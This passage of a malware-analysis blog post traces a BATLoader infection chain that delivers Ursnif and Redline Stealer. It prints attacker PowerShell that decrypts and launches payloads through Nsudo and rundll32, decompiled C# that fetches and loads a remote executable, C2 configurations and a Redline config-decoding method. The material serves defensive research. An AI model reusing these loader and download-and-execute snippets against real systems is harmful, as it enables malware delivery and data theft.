+</span><span class="n">Remove-Encryption</span><span class="w"> </span><span class="nt">-FolderPath</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="s1">'putingod'</span><span class="w">
+</span><span class="o">...</span><span class="w">
+</span></pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">Remove-Encryption</code> command removes GPG encryption from any of the files in AppData\Roaming using the passphrase <code class="language-plaintext highlighter-rouge">putingod</code>. This results in the decrypted Zeip.exe and Zeip.dll before execution using Nsudo, PowerShell, and rundll32.exe.</p><div file="rufus.decoded.ps1" class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="rufus.decoded.ps1"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="o">...</span><span class="w">
+</span><span class="o">.</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="n">\Nsudo.exe</span><span class="w"> </span><span class="nt">-U</span><span class="p">:</span><span class="nx">P</span><span class="w"> </span><span class="nt">-ShowWindowMode</span><span class="p">:</span><span class="nx">Hide</span><span class="w"> </span><span class="nx">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w"> </span><span class="nt">-command</span><span class="w"> </span><span class="s2">"rundll32 </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="s2">\Zeip.dll, DllRegisterServer; </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="s2">\Zeip.exe"</span><span class="w">
+</span><span class="o">...</span><span class="w">
+</span></pre></table></code></div></div><p>The combination of Nsudo and GPG/PGP encryption in payloads is really <a href="https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html">unique to BATLoader</a> and helps us attribute the activity back to that threat.</p><h2 id="decrypting-zeipdll-and-zeipexe-ourselves"><span class="mr-2">Decrypting Zeip.dll and Zeip.exe ourselves</span><a href="#decrypting-zeipdll-and-zeipexe-ourselves" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>If you’re working with a REMnux VM, decrypting the files is really easy:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span>gpg <span class="nt">--decrypt</span> <span class="nt">--output</span> Zeip.exe Zeip.exe.gpg 
+<span class="go">gpg: AES256 encrypted data
+gpg: encrypted with 1 passphrase
+
+</span><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span>gpg <span class="nt">--decrypt</span> <span class="nt">--output</span> Zeip.dll Zeip.dll.gpg 
+<span class="go">gpg: AES256 encrypted data
+gpg: encrypted with 1 passphrase
+</span></pre></table></code></div></div><p>If you’re working with a Windows VM, you’ll likely need to install the same GPG tools the adversary used for decryption in their script.</p><h2 id="analyzing-zeipdll"><span class="mr-2">Analyzing Zeip.dll</span><a href="#analyzing-zeipdll" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Zeip.dll is definitely a DLL file likely made using C/C++ according to <code class="language-plaintext highlighter-rouge">diec</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span>diec Zeip.dll
+<span class="go">PE32
+    Linker: Microsoft Linker(9.9, Visual Studio 2008 9.0*)[DLL32]
+
+</span><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span>pehash Zeip.dll
+<span class="go">file
+    filepath:   Zeip.dll
+    md5:        85fa54c2a97ad3a1f8bd64af62450511
+    sha1:       db92c0a81e8b27d222607e093ccc9d00485db119
+    sha256:     e609894b274a6c42e971e8082af8fd167ade4aef5d1a3816d5acea04839f0b35
+    ssdeep:     12288:cysmuJC4fktsdyjJGL44Clz8JwsWydYo9NRl:cT7IoyjXTKdlnz
+    imphash:    78b4b07ec49eab1076c53a1a1cf86078
+</span></pre></table></code></div></div><p>After looking at the hash values, I learned that the DLL is already in <a href="https://bazaar.abuse.ch/sample/e609894b274a6c42e971e8082af8fd167ade4aef5d1a3816d5acea04839f0b35/">MalwareBazaar</a> and most of the sandbox reports linked agree on the DLL belonging to the <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.gozi">Ursnif/Gozi/ISFB malware family</a>. <a href="https://www.capesandbox.com/analysis/356147/">CAPE</a>, <a href="https://tria.ge/230123-1tw69shc6x/behavioral2">Tria.ge</a>, <a href="https://www.joesandbox.com/analysis/790195/0/html">Joe Sandbox</a>, and <a href="https://www.vmray.com/analyses/_vt/e609894b274a/report/overview.html">VMRay Analyzer</a> all agree that structures in memory during execution match Ursnif YARA rule matches and they even extract the configuration successfully in the reports. Joe Sandbox produced this configuration extraction:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+  </span><span class="nl">"RSA Public Key"</span><span class="p">:</span><span class="w"> </span><span class="s2">"nEv1xgiiSSEq+UsF/sH972dYWlbdaVOznM6pMFVoUS05gtglJzWNlT7nMktPHUwL6//kjiNOqc4tDzQZ19ymuBpLEGqUVvC4ejuRj/0ho+UjebbguqPlH5n0kxpUzAwMML4tOLtp9LPhNicxLWntxqAhB5vWoa98iW2MUoUphRHcd2dO72hrBAGA6DCyFxDcS8WlyxVQ7VBx1Nh+pbslLneoja8gI1kgMhn78GgHQk/qR1oUbrcP/HgzqcZ46oTj/Z8oDh7Uf+bI3Bv799doULwM1Koc6uZt/pcclNdWQSZWvlVfFozPuVvT9NaBray36Sn10KTAPhwPYdk+nFxrudJjVCtbXTj4F13byKvdsT0="</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"c2_domain"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="s2">"trackingg-protectioon.cdn4.mozilla[.]net"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"80.77.23[.]77"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"trackingg-protectioon.cdn4.mozilla[.]net"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"80.77.25[.]109"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"protectioon.cdn4.mozilla[.]net"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"170.130.165[.]182"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"protectioon.cdn4.mozilla[.]net"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"80.77.25[.]114"</span><span class="w">
+  </span><span class="p">],</span><span class="w">
+  </span><span class="nl">"botnet"</span><span class="p">:</span><span class="w"> </span><span class="s2">"20005"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"server"</span><span class="p">:</span><span class="w"> </span><span class="s2">"50"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"serpent_key"</span><span class="p">:</span><span class="w"> </span><span class="s2">"OFX3RdYc8A5rFAaL"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"sleep_time"</span><span class="p">:</span><span class="w"> </span><span class="s2">"3"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"CONF_TIMEOUT"</span><span class="p">:</span><span class="w"> </span><span class="s2">"5"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"SetWaitableTimer_value"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>In addition, ingesting the captured network traffic PCAP file into Suricata resulted in Ursnif alerts:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span><span class="nb">sudo</span> ~/suri-ingest-pcap.sh ursnif-dump.pcap 
+<span class="gp">24/1/2023 -- 00:23:45 - &lt;Notice&gt;</span><span class="w"> </span>- This is Suricata version 6.0.8 RELEASE running <span class="k">in </span>USER mode
+<span class="go">
+[*] Alerts:
+
+</span><span class="gp">"... | ET MALWARE Ursnif Variant CnC Beacon - URI Struct M2 (_2F) | ... 10.127.0.214:49762 -&gt;</span><span class="w"> </span>80.77.23.77:80<span class="s2">"
+</span></pre></table></code></div></div><p>Thus far, the sample seems like Ursnif!</p><h2 id="analyzing-zeipexe"><span class="mr-2">Analyzing Zeip.exe</span><a href="#analyzing-zeipexe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span>diec Zeip.exe
+<span class="go">PE32
+    Library: .NET(v4.0.30319)[-]
+    Linker: Microsoft Linker(48.0)[GUI32]
+</span></pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">diec</code> tool indicates that Zeip.exe is a .NET framework binary, and that doesn’t seem like it would be part of the Ursnif implementation. We can try decompiling to determine its capabilities.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span>ilspycmd <span class="nt">-p</span> <span class="nt">-o</span> ./Zeip-exe-src/ Zeip.exe
+<span class="go">
+</span><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span>tree Zeip-exe-src/
+<span class="go">Zeip-exe-src/
+├── ajshbdvfuhjasgdvjas
+│   └── GUIDLSJKLJLS.cs
+├── app.ico
+├── Properties
+│   └── AssemblyInfo.cs
+├── System\Windows
+│   └── Forms.cs
+├── Zeip.csproj
+├── Zeip\Properties
+│   ├── Resources.cs
+│   └── Settings.cs
+└── Zeip.Properties.Resources.resx
+
+4 directories, 8 files
+</span></pre></table></code></div></div><p>Once decompiled, we can see there are very few code files. The one of most interest is the <code class="language-plaintext highlighter-rouge">GUIDLSJKLJLS.cs</code> file. In that code, there is a <code class="language-plaintext highlighter-rouge">Main()</code> function for the program’s entry point:</p><div file="GUIDLSJKLJLS.cs" class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="GUIDLSJKLJLS.cs"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">goalvsrussia</span><span class="p">.</span><span class="nf">russiawin</span><span class="p">(</span><span class="s">"hxxp://62.204.41[.]176/putingod.exe"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>A URL gets passed into the <code class="language-plaintext highlighter-rouge">russiawin()</code> function, which performs a download of the bytes in the URL. In turn, that function calls more code that performs an <code class="language-plaintext highlighter-rouge">Assembly.Load()</code> call of the downloaded bytes. This implies the downloaded code is most likely additional .NET code. We can take a look in <code class="language-plaintext highlighter-rouge">putingod.exe</code> to determine the next stage as the rest of the code files in this executable are pretty empty.</p><h2 id="analyzing-putingodexe"><span class="mr-2">Analyzing putingod.exe</span><a href="#analyzing-putingodexe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>ILSpyCMD didn’t give me good readable results for this sample, so I had to jump into a FLARE VM and use DNSpy instead. Usually when one doesn’t work for me, the other will. In the initial properties shown by DNSpy, we can see the entry point for the program is under <code class="language-plaintext highlighter-rouge">System.Program</code>.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="c1">// C:\Users\User\Documents\cases\rufus\putingod.exe</span>
+<span class="c1">// Sairs, Version=312.23.2.0, Culture=neutral, PublicKeyToken=null</span>
+
+<span class="c1">// Entry point: System.Program.Main</span>
+<span class="p">...</span>
+
+<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyVersion</span><span class="p">(</span><span class="s">"312.23.2.0"</span><span class="p">)]</span>
+<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">CompilationRelaxations</span><span class="p">(</span><span class="m">8</span><span class="p">)]</span>
+<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">RuntimeCompatibility</span><span class="p">(</span><span class="n">WrapNonExceptionThrows</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
+<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">Debuggable</span><span class="p">(</span><span class="n">DebuggableAttribute</span><span class="p">.</span><span class="n">DebuggingModes</span><span class="p">.</span><span class="n">IgnoreSymbolStoreSequencePoints</span><span class="p">)]</span>
+<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">ComVisible</span><span class="p">(</span><span class="k">false</span><span class="p">)]</span>
+<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyTitle</span><span class="p">(</span><span class="s">"Nokia USB Tool"</span><span class="p">)]</span>
+<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyDescription</span><span class="p">(</span><span class="s">"Nokia Desktop Client"</span><span class="p">)]</span>
+<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyCompany</span><span class="p">(</span><span class="s">"Nokia"</span><span class="p">)]</span>
+<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyProduct</span><span class="p">(</span><span class="s">"Desktop USB Manager"</span><span class="p">)]</span>
+<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyCopyright</span><span class="p">(</span><span class="s">"Nokia Inc. 2022"</span><span class="p">)]</span>
+<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyFileVersion</span><span class="p">(</span><span class="s">"12.2.1"</span><span class="p">)]</span>
+<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">TargetFramework</span><span class="p">(</span><span class="s">".NETFramework,Version=v4.0"</span><span class="p">,</span> <span class="n">FrameworkDisplayName</span> <span class="p">=</span> <span class="s">".NET Framework 4"</span><span class="p">)]</span>
+<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">SecurityPermission</span><span class="p">(</span><span class="n">SecurityAction</span><span class="p">.</span><span class="n">RequestMinimum</span><span class="p">,</span> <span class="n">SkipVerification</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
+</pre></table></code></div></div><p>That starting point is the <code class="language-plaintext highlighter-rouge">Main()</code> function, which doesn’t do much besides call another function to start doing work.</p><div file="Program.cs" class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="Program.cs"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">Program</span><span class="p">.</span><span class="nf">ReadLine</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">ReadLine</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">try</span>
+    <span class="p">{</span>
+        <span class="n">Au</span><span class="err">т</span><span class="n">h</span><span class="err">Ар</span><span class="n">i</span> <span class="n">au</span><span class="err">т</span><span class="n">h</span><span class="err">Ар</span><span class="n">i</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Au</span><span class="err">т</span><span class="n">h</span><span class="err">Ар</span><span class="nf">i</span><span class="p">();</span>
+        <span class="kt">bool</span> <span class="n">flag</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">while</span> <span class="p">(!</span><span class="n">flag</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">foreach</span> <span class="p">(</span><span class="kt">string</span> <span class="n">address</span> <span class="k">in</span> <span class="n">StringDecrypt</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">Arguments</span><span class="p">.</span><span class="n">IP</span><span class="p">,</span> <span class="n">Arguments</span><span class="p">.</span><span class="n">Key</span><span class="p">).</span><span class="nf">Split</span><span class="p">(</span><span class="k">new</span> <span class="kt">char</span><span class="p">[]</span>
+            <span class="p">{</span>
+                <span class="sc">'|'</span>
+            <span class="p">}))</span>
+</pre></table></code></div></div><p>Eagle-eyed readers probably took notice of the <code class="language-plaintext highlighter-rouge">Arguments.IP</code> and <code class="language-plaintext highlighter-rouge">Arguments.Key</code> items. We can potentially infer that the contents of that <code class="language-plaintext highlighter-rouge">Arguments</code> class may contain configuration info. Let’s take a gander.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">Arguments</span>
+<span class="p">{</span>
+	<span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">IP</span> <span class="p">=</span> <span class="s">"GwQ5FC4BJFQZBCEZLwEgVxs6H1EtLyxXGD9NXA=="</span><span class="p">;</span>
+	<span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">ID</span> <span class="p">=</span> <span class="s">"AQMmUjc8M1QMP01c"</span><span class="p">;</span>
+	<span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Message</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
+	<span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Key</span> <span class="p">=</span> <span class="s">"Unpacked"</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>Sure enough, that looks like a configuration block. Some folks in the crowd may recognize this as a configuration structure for <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer">Redline Stealer</a>, which we can test pretty easily given the malware’s <a href="https://cloudsek.com/technical-analysis-of-the-redline-stealer/">well-documented C2 extraction method</a>. We can un-base64 the IP field, XOR the resultant value with the Key field, and then un-base64 again to reveal a C2 address if this is Redline.</p><p><img data-src="/assets/images/batloader-ursnif-redline-oh-my/cyberchef-redline-decoding.png" alt="CyberChef Redline Config Decoding" data-proofer-ignore></p><p>Sure enough, there appears to be a valid C2 address for <code class="language-plaintext highlighter-rouge">62.204.41[.]175:44271</code>. We can validate our findings in a couple ways. First, we can use YARA rules. The <code class="language-plaintext highlighter-rouge">putingod.exe</code> binary matches YARA rules for Redline from the <a href="https://github.com/ditekshen/detection">Ditekshen YARA repository</a>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span>yara <span class="nt">-s</span> malware.yar putingod.exe 
+<span class="go">MALWARE_Win_RedLine putingod.exe
+</span><span class="gp">0x15ff8:$</span>pat14: ,<span class="se">\x</span>00 <span class="se">\x</span>00C<span class="se">\x</span>00o<span class="se">\x</span>00m<span class="se">\x</span>00m<span class="se">\x</span>00a<span class="se">\x</span>00n<span class="se">\x</span>00d<span class="se">\x</span>00L<span class="se">\x</span>00i<span class="se">\x</span>00n<span class="se">\x</span>00e<span class="se">\x</span>00:<span class="se">\x</span>00
+<span class="gp">0x114f1:$</span>v2_1: ListOfProcesses
+<span class="gp">0x112ee:$</span>v4_3: base64str
+<span class="gp">0x11c91:$</span>v4_4: stringKey
+<span class="gp">0xfef6:$</span>v4_5: BytesToStringConverted
+<span class="gp">0xede9:$</span>v4_6: FromBase64
+<span class="gp">0x1035a:$</span>v4_8: procName
+<span class="gp">0xfded:$</span>v5_9: BCRYPT_KEY_LENGTHS_STRUCT
+</pre></table></code></div></div><p>In addition, we can use Suricata rules on PCAP data exported from <a href="https://tria.ge/230123-vs48laec99/behavioral2">Tria.ge</a>, which again indicates Redline activity.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/rufus$</span><span class="w"> </span><span class="nb">sudo</span> ~/suri-ingest-pcap.sh redline-dump.pcap 
+<span class="gp">24/1/2023 -- 01:00:44 - &lt;Notice&gt;</span><span class="w"> </span>- This is Suricata version 6.0.8 RELEASE running <span class="k">in </span>USER mode
+<span class="go">
+[*] Alerts:
+
+</span><span class="gp">"... | ET MALWARE RedLine Stealer TCP CnC net.tcp Init | ... 10.127.0.10:49744 -&gt;</span><span class="w"> </span>62.204.41.175:44271<span class="s2">"
+</span><span class="gp">"... | ET MALWARE Redline Stealer TCP CnC Activity | ... 10.127.0.10:49744 -&gt;</span><span class="w"> </span><span class="s2">62.204.41.175:44271"</span>
+<span class="gp">"... | ET MALWARE Redline Stealer TCP CnC - Id1Response | ... 62.204.41.175:44271 -&gt;</span><span class="w"> </span>10.127.0.10:49744<span class="s2">"
+</span><span class="gp">"... | ET MALWARE Redline Stealer TCP CnC Activity | ... 10.127.0.10:49744 -&gt;</span><span class="w"> </span><span class="s2">62.204.41.175:44271"</span>
+</pre></table></code></div></div><p>So I’m pretty confident we’ve successfully identified Redline alongside BATLoader and Ursnif! This is the end of the trail for this sample unless you want to further pull apart Ursnif to identify more details. That will be a bit more difficult than the Redline sample, so I opted not to do so tonight. Thanks for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware/'>malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/batloader/" class="post-tag no-text-decoration" >batloader</a> <a href="/tags/msi/" class="post-tag no-text-decoration" >msi</a> <a href="/tags/ursnif/" class="post-tag no-text-decoration" >ursnif</a> <a href="/tags/redline/" class="post-tag no-text-decoration" >redline</a> <a href="/tags/gpg/" class="post-tag no-text-decoration" >gpg</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a> <a href="/tags/msitools/" class="post-tag no-text-decoration" >msitools</a> <a href="/tags/msidump/" class="post-tag no-text-decoration" >msidump</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=BATLoader, Ursnif, and Redline, oh my! - Tony Lambert&amp;url=https://forensicitguy.github.io/batloader-ursnif-redline-oh-my/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=BATLoader, Ursnif, and Redline, oh my! - Tony Lambert&amp;u=https://forensicitguy.github.io/batloader-ursnif-redline-oh-my/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://forensicitguy.github.io/batloader-ursnif-redline-oh-my/&amp;text=BATLoader, Ursnif, and Redline, oh my! - Tony Lambert" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://forensicitguy.github.io/batloader-ursnif-redline-oh-my/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/pecheck-malware-weight-loss/">Bad Guys Hate This Trick for Malware Weight Loss!</a><li><a href="/formbook-via-vbs-powershell-and-csharp/">Formbook Distributed Via VBScript, PowerShell, and C# Code</a><li><a href="/agenttesla-vba-certutil-download/">An AgentTesla Sample Using VBA Macros and Certutil</a><li><a href="/my-sans-dfir-netwars-experience/">My SANS DFIR NetWars Experience</a><li><a href="/making-meterpreter-look-google-signed/">Making Meterpreter Look Google Signed</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/analyzing-stealer-msi-using-msitools/"><div class="card-body"> <em class="timeago small" data-ts="1644624000" > 2022-02-12 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Analyzing a Stealer MSI using msitools</h3><div class="text-muted small"><p> This post is dedicated to Josh Rickard (@MSAdministrator on Twitter) since his feedback on my blog posts has cut my triage time on MSI files down in a massive way! After writing an analysis of a MS...</p></div></div></a></div><div class="card"> <a href="/smarter-not-harder-malware-analysis/"><div class="card-body"> <em class="timeago small" data-ts="1630800000" > 